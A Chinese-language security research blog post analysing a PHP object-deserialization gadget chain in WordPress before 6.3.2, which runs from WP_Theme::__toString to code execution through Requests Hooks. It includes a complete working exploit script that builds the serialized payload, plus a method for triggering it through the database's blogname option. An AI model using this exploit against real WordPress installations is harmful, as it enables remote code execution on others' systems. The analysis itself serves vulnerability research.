title: WordPress＜6.3.2 __toString 反序列化链分析
author: Bmth
tags:
  - 
categories:
  - 代码审计
top_img: 'https://img-blog.csdnimg.cn/025c742cd68b44eaac016be17b614b00.png'
cover: 'https://img-blog.csdnimg.cn/025c742cd68b44eaac016be17b614b00.png'
date: 2023-11-03 15:15:00
---
![](https://img-blog.csdnimg.cn/025c742cd68b44eaac016be17b614b00.png)

## 环境搭建
我这里使用phpstudy搭建的 WordPress 环境，官网下载 6.3.1 版本，[https://wordpress.org/download/releases/](https://wordpress.org/download/releases/)

注意在安装的时候会自动更新到wordpress最新版本，需要禁止自动更新

在填完数据库信息，点下一步之后会生成 wp-config.php 文件，这个时候在 wp-config.php 文件中添加如下代码即可：
```php
define( 'WP_AUTO_UPDATE_CORE', false );
```
![](https://img-blog.csdnimg.cn/22390e2a015140c88dfe15b5ccfe5779.png)

创建漏洞点，需要包含`wp-load.php`，然后调用`wp()`函数初始化
```php
<?php

require_once __DIR__ . '/wp-load.php';

// Set up the WordPress query.
wp();

$a = unserialize('...');

echo $a;
```

## 漏洞分析
`wp-includes/class-wp-theme.php`
![](https://img-blog.csdnimg.cn/a98dcb10e5a049ce99792a530c97fc7d.png)

通过`__toString`会调用到它的 display 方法
![](https://img-blog.csdnimg.cn/a605457fcf1e433f9fb273af73d3b2ac.png)

跟进到 get 方法
![](https://img-blog.csdnimg.cn/c2700b735c0c46c09151e6c07c7a9bda.png)

如果实现了 ArrayAccess 接口，即数组式访问，那么在执行`$this->headers[ $header ]`时会调用 offsetGet 方法
### ArrayAccess接口的妙用
这里找到`wp-includes/class-wp-block-list.php`
![](https://img-blog.csdnimg.cn/8df49fe168d14260b2371a96f3a7401f.png)

进行实例化 WP_Block 类，参数都是可控的，跟进到它的`__construct`方法
`wp-includes/class-wp-block.php`
![](https://img-blog.csdnimg.cn/703b6c7e26914c5fb5a40e893844fb20.png)

调用到`WP_Block_Type_Registry`的 get_registered 方法，并且这里`$this->name`可控
`wp-includes/class-wp-block-type-registry.php`
![](https://img-blog.csdnimg.cn/76c3d56b22f54140b03dd51c58c5368b.png)

又是一个执行 offsetGet 的操作，区别是这一次数组索引是可控的

再次看到 WP_Theme 类，该类也实现了 ArrayAccess 接口
`wp-includes/class-wp-theme.php`
![](https://img-blog.csdnimg.cn/213b43fabfd84311bdde07db803b7873.png)

当`$offset`为 Parent Theme 的时候，调用
```php
return $this->parent() ? $this->parent()->get( 'Name' ) : '';
```
![](https://img-blog.csdnimg.cn/06c9d1b7fe3d45259988d0b167de01f7.png)

这里会调用`$this->parent`该对象的 get 方法

### get方法到RCE
找到`wp-includes/Requests/src/Session.php`的get方法
![](https://img-blog.csdnimg.cn/c756bc93aeec4d7ebcd48291a983a9bd.png)

跟进到 request 方法
![](https://img-blog.csdnimg.cn/433237ceb8a04d788c1620ac384b8616.png)

跟进 merge_request 方法
![](https://img-blog.csdnimg.cn/581b37a193724902af46b56319a66b2f.png)

我们的`$request`内容可控
```php
return Requests::request($request['url'], $request['headers'], $request['data'], $type, $request['options']);
```
走到`wp-includes/Requests/src/Requests.php`
![](https://img-blog.csdnimg.cn/769c549f5df44a2c84987b8af5912189.png)

我们设置`$options['hooks']`为 Hooks 类，那么就会调用它的dispatch方法

`wp-includes/Requests/src/Hooks.php`
```php
public function dispatch($hook, $parameters = []) {
	if (is_string($hook) === false) {
		throw InvalidArgument::create(1, '$hook', 'string', gettype($hook));
	}

	// Check strictly against array, as Array* objects don't work in combination with `call_user_func_array()`.
	if (is_array($parameters) === false) {
		throw InvalidArgument::create(2, '$parameters', 'array', gettype($parameters));
	}

	if (empty($this->hooks[$hook])) {
		return false;
	}

	if (!empty($parameters)) {
		// Strip potential keys from the array to prevent them being interpreted as parameter names in PHP 8.0.
		$parameters = array_values($parameters);
	}

	ksort($this->hooks[$hook]);

	foreach ($this->hooks[$hook] as $priority => $hooked) {
		foreach ($hooked as $callback) {
			$callback(...$parameters);
		}
	}

	return true;
}
```
这里引用了可变函数的概念：[https://www.php.net/manual/zh/functions.variable-functions.php](https://www.php.net/manual/zh/functions.variable-functions.php)
如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途

即：
![](https://img-blog.csdnimg.cn/c47c05250fd8493ca918f1f2d5a6249a.png)

我们可以递归调用一次`Hooks::dispatch()`方法，变成了：
```php
$options['hooks']->dispatch($url, $headers, &$data, &$type, &$options])
```
又由于该方法只需要两个参数，那么`$data`、`$type`、和`$options`将不被使用
![](https://img-blog.csdnimg.cn/37df11c523534b46b28298841b3d574e.png)

最后通过`$callback(...$parameters);`可变长参数实现RCE

## 漏洞利用
最后实现的exp：
```php
<?php

namespace WpOrg\Requests
{
    class Session
    {
        public $url;
        public $headers;
        public $options;

        public function __construct($url, $headers, $options)
        {
            $this->url = $url;
            $this->headers = $headers;
            $this->options = $options;
        }
    }

    class Hooks
    {
        public $hooks;

        public function __construct($hooks)
        {
            $this->hooks = $hooks;
        }
    }
}

namespace {
    use WpOrg\Requests\Hooks;
    use WpOrg\Requests\Session;

    final class WP_Block_Type_Registry
    {
        public $registered_block_types;

        public function __construct($registered_block_types)
        {
            $this->registered_block_types = $registered_block_types;
        }
    }

    class WP_Block_List
    {
        public $blocks;
        public $registry;

        public function __construct($blocks, $registry)
        {
            $this->blocks = $blocks;
            $this->registry = $registry;
        }
    }

    final class WP_Theme
    {
        public $headers;
        public $parent;

        public function __construct($headers = null, $parent = null)
        {
            $this->headers = $headers;
            $this->parent = $parent;
        }
    }

    $blocks = array(
        'Name' => array(
            'blockName' => 'Parent Theme'
        )
    );
    $hooks_recurse_once = new Hooks(
        array(
            'http://p:0/Name' => array(
                array('system')
            )
        )
    );
    $hooks = new Hooks(
        array(
            'requests.before_request' => array(
                array(
                    array(
                        $hooks_recurse_once,
                        'dispatch'
                    )
                )
            )
        )
    );

    $parent = new Session('http://p:0', array("calc"), array('hooks' => $hooks));
    $registered_block_types = new WP_Theme(null, $parent);
    $registry = new WP_Block_Type_Registry($registered_block_types);
    $headers = new WP_Block_List($blocks, $registry);

    echo serialize(new WP_Theme($headers));
}
```
调用栈如下：
```
Hooks.php:93, WpOrg\Requests\Hooks->dispatch()
Hooks.php:93, WpOrg\Requests\Hooks->dispatch()
Requests.php:455, WpOrg\Requests\Requests::request()
Session.php:232, WpOrg\Requests\Session->request()
Session.php:159, WpOrg\Requests\Session->get()
class-wp-theme.php:702, WP_Theme->offsetGet()
class-wp-block-type-registry.php:145, WP_Block_Type_Registry->get_registered()
class-wp-block.php:130, WP_Block->__construct()
class-wp-block-list.php:96, WP_Block_List->offsetGet()
class-wp-theme.php:833, WP_Theme->get()
class-wp-theme.php:851, WP_Theme->display()
class-wp-theme.php:513, WP_Theme->__toString()
```

后续的利用方式找到了当年一篇有意思的文章：[WordPress < 3.6.1 PHP Object Injection
](https://wooyun.js.org/drops/WordPress%20.%203.6.1%20PHP%20%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)
![](https://img-blog.csdnimg.cn/ecc2379f1a3341fb89ccd0fc58b3f672.png)

简单来说就是获取数据库中的 metadata 时，会调用`maybe_unserialize`对数据处理，如果通过 insert、update 将数据写入到数据库中，或者能够控制数据库，就会执行反序列化操作
![](https://img-blog.csdnimg.cn/6f48e6eb38cc4491ae0953f6528c0bee.png)

我们通过数据库修改在前台会显示的内容为我们的payload，即会调用`__toString`方法，这里我修改的为 wp_options 表中blogname的value

访问首页，成功RCE
![](https://img-blog.csdnimg.cn/6eaea2b0216b417092107b032507111b.png)


参考：
[WordPress Core RCE Gadget 分析](https://exp10it.cn/2023/10/wordpress-core-rce-gadget-%E5%88%86%E6%9E%90/)
[Finding A RCE Gadget Chain In WordPress Core](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/)
[https://github.com/ambionics/phpggc/blob/master/gadgetchains/WordPress/RCE/1/chain.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/WordPress/RCE/1/chain.php)
